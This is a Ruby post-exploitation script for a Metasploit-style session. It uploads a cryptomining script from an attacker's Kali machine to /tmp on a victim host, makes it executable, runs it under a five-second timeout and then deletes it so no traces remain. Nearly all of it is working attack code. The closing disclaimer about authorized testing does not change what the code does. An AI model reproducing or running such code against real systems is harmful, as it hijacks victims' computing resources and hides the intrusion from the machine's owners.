# This script is used to upload, execute, and clean up a cryptomining script on a remote victim machine.
# 
# Steps performed by the script:
# 
# 1. **Upload Cryptomining Script**:
#    - The script checks if the cryptomining script exists on the attacker's machine at the specified local path.
#    - If the script exists, it uploads the file to the victim machine at the specified remote path.
#    - If the script does not exist, an error message is displayed, and the process is terminated.
# 
# 2. **Set Execute Permissions**:
#    - After uploading, the script sets execute permissions on the uploaded file to ensure it can be executed on the victim machine.
# 
# 3. **Execute Cryptomining Script**:
#    - The script executes the uploaded cryptomining script on the victim machine.
#    - The execution is limited to 5 seconds using the `timeout` command to control the runtime.
# 
# 4. **Clean Up**:
#    - After execution, the script removes the uploaded cryptomining script from the victim machine to clean up any traces.
# 
# Note:
# - This script is intended for educational or authorized testing purposes only. Unauthorized use of this script may violate laws and ethical guidelines.

# Define the paths for the cryptomining script on both attacker and victim machines
local_cryptomining_script = "/home/kali/Documents/cryptomining.sh"   # Local path on attacker machine
remote_cryptomining_script = "/tmp/cryptomining.sh"                 # Remote path on victim machine

# Step 1: Upload the cryptomining script to the victim machine
print_status("Uploading cryptomining script to the victim machine...")
if File.exist?(local_cryptomining_script)
  session.fs.file.upload_file(remote_cryptomining_script, local_cryptomining_script)
  print_good("Cryptomining script uploaded successfully.")
else
  print_error("Cryptomining script does not exist on the attacker machine.")
  return
end

# Step 2: Set the uploaded script as executable
print_status("Setting execute permissions for the uploaded script...")
cmd_exec("chmod +x #{remote_cryptomining_script}")

# Step 3: Execute the cryptomining script on the victim machine for 5 seconds
print_status("Executing the cryptomining script on the victim machine for 5 seconds...")
cmd_exec("bash -c 'timeout 5 #{remote_cryptomining_script}'")

# Step 4: Clean up by removing the uploaded script
print_status("Cleaning up uploaded files...")
cmd_exec("rm -f #{remote_cryptomining_script}")
print_good("Cryptomining script executed and cleaned up.")